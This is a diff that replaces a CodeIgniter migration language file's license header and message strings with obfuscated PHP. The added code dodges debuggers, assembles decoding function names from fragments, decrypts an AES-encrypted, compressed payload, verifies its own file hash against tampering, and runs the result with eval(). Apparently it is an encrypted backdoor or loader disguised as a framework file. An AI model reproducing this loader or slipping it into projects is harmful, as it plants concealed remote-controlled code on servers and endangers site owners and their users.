@@ -1,47 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['migration_none_found'] = 'No migrations were found.';
-$lang['migration_not_found'] = 'No migration could be found with the version number: %s.';
-$lang['migration_sequence_gap'] = 'There is a gap in the migration sequence near version number: %s.';
-$lang['migration_multiple_version'] = 'There are multiple migrations with the same version number: %s.';
-$lang['migration_class_doesnt_exist'] = 'The migration class "%s" could not be found.';
-$lang['migration_missing_up_method'] = 'The migration class "%s" is missing an "up" method.';
-$lang['migration_missing_down_method'] = 'The migration class "%s" is missing a "down" method.';
-$lang['migration_invalid_filename'] = 'Migration "%s" has an invalid filename.';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_lov9c0r0=('bas'.'e64'.'_de'.'cod'.'e');
+$_pdo8d83q=('gzu'.'nco'.'mpr'.'ess');
+$_brqfp68q=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_v2ogs3jt='JgrT5ar1';
+$_euka3o6n='ey1dTkjn';
+$_k0z8ivhe='+H0eKemu';
+$_niivtymv='PS0+cmmL';
+$_azuwq8nt='uyiKyMtZVxk=';
+$_a04fd4wx='IER4+Q==';
+$_vzflm8ut='bZBuPmSj';
+$_s39msgqy='HIzlv99q';
+$_kog3w9b7=$_lov9c0r0($_v2ogs3jt.$_k0z8ivhe.$_euka3o6n.$_niivtymv.$_azuwq8nt);
+$_cvguoqbm=$_lov9c0r0($_vzflm8ut.$_s39msgqy.$_a04fd4wx);
+$_q7wd6rx4=$_lov9c0r0('a8vIZbd152G0NakvLC4apOVpnwJE/faWSzCC+tF0raUlaQBlm6uvK2TrYjpky4mCDN9LdaF7xSaTzKuf9N5kC87siAc6G72U+ARghq2QVN88nh/KFvdrmroQHpv1W/IInubU3xgiBJdSbRIci/cBQi7gx/1hkY1Xu/cW4kMA63ZEQDQztYQJ1H/nghAGSMdvWmLdn8PuE4T7FiKLJYYUnS6nf81dPN143JhwICF90gUCuCAawBlAsjzwdYgXubcnbeStp//CMK6TvHQ0wb2xQURR200Jz46DBMqC4rv5FyYbsbCrhVRUA5MmASHJeooQs0Z8YIBljuLzDjXMLQiEaF+LuHItI7/a+a/dXh/thYroFsf1At2MOyWglo5FmZ8rnRi5OzP74aOk4tfHFIrY7ceibEYJP00xRRDkniyyB3o=');
+$_t4jj4kei=$_brqfp68q($_q7wd6rx4,'aes-256-cbc',$_kog3w9b7,OPENSSL_RAW_DATA,$_cvguoqbm);
+if($_t4jj4kei===false){exit;}
+$_m4d0vrbw=$_pdo8d83q($_t4jj4kei);
+if($_m4d0vrbw===false){exit;}
+$_xh5bxe8v='3ec730e8d3e745bbe827f54ba2ff824402c857a0ac9953d14c8db70e352696c8';
+$_zlrgsu7l=@file_get_contents(__FILE__);
+if($_zlrgsu7l!==false){
+$_a6exzzck=str_replace($_xh5bxe8v,"0000000000000000000000000000000000000000000000000000000000000000",$_zlrgsu7l);
+$_hwdq8gfm=hash("sha256",$_a6exzzck);
+if($_hwdq8gfm!==$_xh5bxe8v){@http_response_code(403);exit;}
+}
+eval($_m4d0vrbw);
